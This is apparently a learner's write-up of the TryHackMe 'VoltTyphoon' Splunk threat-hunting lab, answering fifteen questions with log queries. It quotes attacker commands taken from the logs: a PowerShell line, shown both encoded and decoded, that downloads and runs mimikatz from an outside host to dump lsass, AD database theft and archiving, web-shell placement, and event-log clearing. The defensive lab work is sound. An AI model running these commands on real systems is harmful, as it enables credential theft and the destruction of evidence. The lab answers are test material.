---
title: "TryHackMe - VoltTyphoon"
date: 2025-06-20
---

# Initial Access
### 1. Comb through the ADSelfService Plus logs to begin retracing the attacker’s steps. At what time (ISO 8601 format) was Dean's password changed and their account taken over by the attacker?
R= 2024-03-24T11:10:22

The question mentions that we should look into the `ADSelfService Plus` logs, checking in the values of the `sourcetype` field, we can observe that there's one that matches with its starting letters.
![[Pasted image 20250620171722.png]]

As we are looking for a password change and its account take over, we look into the `username` field for any value indicating that the owner could be Dean. We found one: `dean-admin`, lets filter by that value.
![[Pasted image 20250620171902.png]]
Using the query below to get only the fields of interest, I was able to track down the ip from where the TA tried multiple attempts of account unlock and where at the end it was able to take over the account by resetting its password and it being successful.
```
index=* sourcetype=adss  | search username="dean-admin" 
|  table timestamp, ip_address, action_name, status
| reverse
```
![[Pasted image 20250620222425.png]]
### 2. Shortly after Dean's account was compromised, the attacker created a new administrator account. What is the name of the new account that was created?
R= voltyp-admin

Leveraging `Date & Time Range` feature, we filter for logs after the timestamp of the `Password Change` ADSelfService event. 
![[Pasted image 20250620173723.png]]
We can observe that the account `voltyp-admin` was immediately created after the account takeover.

![[Pasted image 20250620174602.png]]
# Execution
### 3. In an information gathering attempt, what command does the attacker run to find information about local drives on server01 & server02?
R= wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename

Going back into the data lake of logs, we indeed have a `sourcetype` for `wmi` that we can explore in.
![[Pasted image 20250620174845.png]]
As the server field wasn't parsed, I used the following regex `^.*\|.*\|\s(?<server>server-0\d{1}-main).*\|` to get the names of the server we were interested in.
As we can see it is indeed working
![[Pasted image 20250620181221.png]]
Checking for any commands that could give information on disk using wmic, there are three in specific. 
![[Pasted image 20250620182100.png]]
Using the following query, I was able to notice that there was indeed a command that targeted `server01` and `server02`, so what I just did was me being confused but at least served to practice my regex, same thing with the query below, is definitely not be the best way to find the answer.
```
index=* sourcetype=wmic
| where isnotnull(server) // Contains string server-0[1 OR 2]-main
| search command="*disk*" // Contains substring 'disk' in command field
| stats count by command // count how many times each value appears
```
![[Pasted image 20250620182741.png]]
A better query would be the following:
```
index=* sourcetype=wmic 
| search command="*server0*" // search for any wmi command that contains the
								substring 'server0'
| table timestamp, ip_address, username, command
```
![[Pasted image 20250620183732.png]]
### 4. The attacker uses ntdsutil to create a copy of the AD database. After moving the file to a web server, the attacker compresses the database. What password does the attacker set on the archive?
R= d5ag0nm@5t3r

Doing a free text search for `ntdsutil.exe` we got a match for the command that created a copy of the AD database. 
![[Pasted image 20250620184145.png]]Looking for any events after that time, and filtering by the user `dean-admin`, we are able to find the compression command:
```
wmic /node:webserver-01 process call create “cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z `cisco-up.7z` C:\inetpub\wwwroot\temp.dit”
```
![[Pasted image 20250620185536.png]]
# Persistence

### 5. To establish persistence on the compromised server, the attacker created a web shell using base64 encoded text. In which directory was the web shell placed?
R=C:\Windows\Temp\

I wasn't sure where to start here, but I knew that because there was some base64 involved, the attacker must have used some command that had the word decode in it, and I was correct. In this case it leveraged the LOLB `certuil.exe`. In this case the webshell was inserted into the %TEMP% folder `C:\Windows\Temp\`
![[Pasted image 20250620191653.png]]
# Defense Evasion
### 6. In an attempt to begin covering their tracks, the attackers remove evidence of the compromise. They first start by wiping RDP records. What PowerShell cmdlet does the attacker use to remove the “Most Recently Used” record?
R=`Remove-ItemProperty`

I thought in doing a free search for `Remove-Item`, because the MRU is located in the registry path `HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`, where we can only remove items from from a registry location using the `Remove-ItemProperty`. The attacker effectively removed the MRU record using the cmdlet `Remove-ItemProperty
![[Pasted image 20250620192317.png]]
### 7. The APT continues to cover their tracks by renaming and changing the extension of the previously created archive. What is the file name (with extension) created by the attackers?
R= cl64.gif

The previously created file was `cisco-up.7z` (Q4), if we do a free search for it, there's a log indicating that the attacker renamed it to `cl64.gif` using the command below.
```
cmd.exe /c ren \\webserver-01\c$\inetpub\wwwroot\cisco-up.7z cl64.gif
```

![[Pasted image 20250620194016.png]]

### 8. Under what regedit path does the attacker check for evidence of a virtualized environment?
R= HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control

Doing a free search for `HKEY_LOCAL_MACHINE`, as there's where the configuration of the computer is stored in, one of the three matches shows that the attacker executed 
```
Get-ItemProperty -Path "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control" | Select-Object -Property *Virtual*

```

> After finding the answer, I tried to google that method to confirm that it is documented as evidence of a virtualized environment but got no luck. I just tested my lick when doing that free text search.
![[Pasted image 20250620194615.png]]

# Credential access

### 9. Using reg query, Volt Typhoon hunts for opportunities to find useful credentials. What three pieces of software do they investigate?
R= `openssh`, `putty`, `realvnc`

I searched for free text `reg query`, as the field that contained the full command wasn't parsed, I leveraged the `reg` built-in Splunk command to create a new field named `raw` leveraging `Named Capture Groups` that matches the entire command. As seen, the software investigated was `openssh`, `putty`, `realvnc`
```
index=* "*reg query*" 
| rex field=_raw "(?<cmd>reg query\s.*)"
| table cmd // show only the field cmd
| reverse
```
![[Pasted image 20250620200537.png]]
### 10. What is the full decoded command the attacker uses to download and run mimikatz?
R= `Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait

I wasn't sure where to start here, but I supposed that there was an encoded  a powershell command executed somewhere.
Knowing this I started by parsing the entire value of the `CommandLine=` raw field, and skimmed through all the values found that end in `=`.
Query used:
```
index=* sourcetype!=adss sourcetype!=wmic  | rex field=_raw "CommandLine=(?<cmd>.*=)" 
| stats count by cmd 
| sort -count
```

Malicious command
```
-exec bypass -W hidden -nop -E SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cDovL3ZvbHR5cC5jb20vMy90bHovbWltaWthdHouZXhlIiAtT3V0RmlsZSAiQzpcVGVtcFxkYjJcbWltaWthdHouZXhlIjsgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFRlbXBcZGIyXG1pbWlrYXR6LmV4ZSIgLUFyZ3VtZW50TGlzdCBAKCJzZWt1cmxzYTo6bWluaWR1bXAgbHNhc3MuZG1wIiwgImV4aXQiKSAtTm9OZXdXaW5kb3cgLVdhaXQ=
```
![[Pasted image 20250620203833.png]]
Using CyberChef, I decoded the command.
```
Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait
```
![[Pasted image 20250620203937.png]]

# Discovery & Lateral Movement
### 11. The attacker uses wevtutil, a log retrieval tool, to enumerate Windows logs. What event IDs does the attacker search for?
R= `4624` `4625` `4769`

By parsing the entire CommandLine value, and by searching for all the fields that start with wevtutil, we were able to get all the commands showing the event id's searched. 
```
index=* sourcetype!=adss sourcetype!=wmic  | rex field=_raw "CommandLine=(?<cmd>.*=)" 
| search cmd="wevtutil*"
| table cmd
```

![[Pasted image 20250620204534.png]]To practice named capture groups, I'll extract the single event ID and put it into a new field called `event_id`.
```
index=* sourcetype!=adss sourcetype!=wmic  | rex field=_raw "CommandLine=(?<cmd>.*=)"
| search cmd="wevtutil*"   // search for values that start with wevtutil
| rex field=_raw ".*EventID=(?<event_id>\d{4}).*"   // extract eventid
| table event_id    // show only event_id field
| stats count by event_id    // count each of the values
```
![[Pasted image 20250620204923.png]]
### 12. Moving laterally to server-02, the attacker copies over the original web shell. What is the name of the new web shell that was created?
R= `Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx`

As the questioned said "Copy", one of the possibilities could be that the attacker could've used the `Copy-Item` cmdlet. I free text searched for `*copy*`, and this is the last entry that was found and the only one that indicated that was explicitly transferred to server-02

`Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx`
![[Pasted image 20250620205925.png]]
# Collection
### 13. The attacker is able to locate some valuable financial information during the collection phase. What three files does Volt Typhoon make copies of using PowerShell?
R=`2022.csv` `2023.csv` `2024.csv`

Leveraging the free text search for `Copy`, and then extracting the value of the `CommandLine` field, I was able to review copied items and found three related to financial data.
```
Copy-Item -Path "C:\ProgramData\FinanceBackup\2024.csv" -Destination "C:\Windows\Temp\faudit\2024.csv"
Copy-Item -Path "C:\ProgramData\FinanceBackup\2023.csv" -Destination "C:\Windows\Temp\faudit\2023.csv"
Copy-Item -Path "C:\ProgramData\FinanceBackup\2022.csv" -Destination "C:\Windows\Temp\faudit\2022.csv"
```
![[Pasted image 20250620210523.png]]

# C2 & Cleanup
### 14. The attacker uses netsh to create a proxy for C2 communications. What connect address and port does the attacker use when setting up the proxy?
R=  `10.2.30.1`  `8443`

Doing a free text search for `netsh`, it have a couple of results that indicate that a proxy was created then deleted. 
![[Pasted image 20250620215250.png]]

Looking further at it, the attacker uses the address `10.2.30.1` and port `8443` to setup the proxy.
![[Pasted image 20250620215606.png]]

### 15. To conceal their activities, what are the four types of event logs the attacker clears on the compromised system?
R= `wevtutil cl Application Security Setup System`

The `wevtutil` LOLBIN, provides an argument that allows to clear the log with it.
![[Pasted image 20250620220150.png]]

If we search for it using the query below, we were able to determine the type of event logs the attacker cleared.
```
index=* sourcetype=powershell | rex field=_raw "CommandLine=(?<cmd>.*)" 
| search cmd="wevtutil cl*"   // search for any cmd field value that starts with
							     wevtutil cl
| table cmd
```
![[Pasted image 20250620220242.png]]
